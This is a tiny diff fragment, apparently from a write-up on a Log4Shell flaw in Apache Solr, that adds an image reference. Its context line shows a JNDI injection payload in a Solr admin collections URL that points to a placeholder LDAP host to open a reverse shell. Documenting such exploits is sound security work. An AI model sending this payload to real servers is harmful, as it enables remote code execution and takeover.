@@ -6,3 +6,4 @@
 /solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/9999}&wt=json
 ```
 
+![](1.png)
